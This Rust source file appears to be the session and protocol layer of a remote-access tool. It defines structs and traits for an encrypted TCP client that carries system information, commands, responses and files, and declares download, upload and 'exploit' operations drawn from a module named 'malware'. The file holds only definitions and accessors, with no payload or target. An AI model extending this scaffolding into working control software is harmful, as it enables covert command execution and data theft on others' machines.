use std::net::TcpStream;

use crate::{
    malware::Exploits,
    structure::{
        enums::{
            EncryptType,
            EncryptType::NotEncryption,
            Packet,
            HandshakeType,
            ParseError
        },
        structs::define::StructStone,
        traits::define::Detector,
    },
    utility::secure::{
        crypto::Crypto,
        utils::{AesGcmSivCrypto, RsaCrypto},
    },
};

pub trait PacketProcessing {
    fn take_packet<T>(&self) -> T;

    fn get_packet<T>(&self) -> T;

    fn set_packet<T>(&mut self, packet: T) -> T;
}

pub struct Session {
    handshake_type: HandshakeType,
    encryption: EncryptType,
    socket: TcpStream,
    packet: Packet,
    cipher: Cipher
}

pub struct Client {
    pub session: Session,
    pub exploits: Exploits,
}

pub(crate) struct Cipher {
    aes: AesGcmSivCrypto,
    rsa: RsaCrypto
}

pub struct ProtocolEditor {
    session: Session,
    exploits: Exploits,
}

type SResult<T> = std::io::Result<T>;

impl Session {
    pub fn take_packet(&self) -> &Packet {
        &self.packet
    }
    pub fn get_packet(&self) -> Packet {
        self.packet.clone()
    }
    pub fn set_packet(&mut self, packet: Packet) {
        self.packet = packet
    }
    pub fn take_socket(&self) -> &TcpStream {
        &self.socket
    }
    pub fn set(handshake_type: HandshakeType, encryption: EncryptType, socket: TcpStream, packet: Packet) -> Session {
        match &packet {
            Packet::StructStone { .. } |
            Packet::SecureHandshakePacket { .. } |
            Packet::SecurePacket { .. }
            => {
                let cipher = Cipher {  aes: AesGcmSivCrypto::default(), rsa: RsaCrypto::default()  };
                Session { handshake_type, encryption, socket, packet, cipher }
            }
        }
    }
    pub fn take_handshake_type(&self) -> &HandshakeType {
        &self.handshake_type
    }
    pub fn set_handshake(&mut self, handshake_type: HandshakeType) {
        self.handshake_type = handshake_type
    }
    pub fn set_encryption(&mut self, encryption: EncryptType) {
        self.encryption = encryption
    }
    pub fn is_encryption(&self) -> bool {
        if self.encryption == NotEncryption {
            false
        } else {
            true
        }
    }
}


impl Client {
    pub fn set_packet(&mut self, packet: Packet) {
        self.session.set_packet(packet)
    }

    pub fn take_sysinfo(&self) -> Option<&Vec<u8>> { self.session.take_packet().take_sysinfo() }

    pub fn take_command(&self) -> Option<&Vec<u8>> {
        self.session.take_packet().take_command()
    }

    pub fn take_response(&self) -> Option<&Vec<u8>> {
        self.session.take_packet().take_response()
    }

    pub fn take_file(&self) -> Option<&Vec<u8>> {
        self.session.take_packet().take_file()
    }

    pub fn get_sysinfo(&self) -> Vec<u8> { self.session.take_packet().get_sysinfo() }

    pub fn get_command(&self) -> Vec<u8> {
        self.session.take_packet().get_command()
    }

    pub fn get_response(&self) -> Vec<u8> {
        self.session.take_packet().get_response()
    }

    pub fn get_file(&self) -> Vec<u8> {
        self.session.take_packet().get_file()
    }
    pub fn use_encrypt(&mut self, encryption: EncryptType, handshake_type: HandshakeType) {
        self.session.set_handshake(handshake_type);
        self.session.set_encryption(encryption);
        self.session.cipher.aes.setup().expect("self.session.aes_cipher.setup()");
        self.session.cipher.rsa.setup().expect("self.session.rsa_cipher.setup()");
    }
}


pub trait HandleSession {
    fn new(address: &str) -> Session;
    fn encryption(&mut self) -> Result<(), ParseError>;
    fn decryption(&mut self) -> Result<(), ParseError>;
    fn send(&mut self) -> SResult<&Packet>;
    fn recv(&mut self, buffer_size: usize) -> Vec<u8>;
    fn receiving(&mut self, buffer: StructStone) -> Packet;
}

pub trait HandleProtocols {
    fn response(&mut self, msg: &str) -> SResult<&Packet>;
    fn disconnect(&mut self);
    fn download(&mut self) -> SResult<&Packet>;
    fn upload(&mut self) -> SResult<&Packet>;
    fn exploit(&mut self) -> SResult<&Packet>;
}

pub trait Handlers {
    fn default_client_handler(&mut self);
}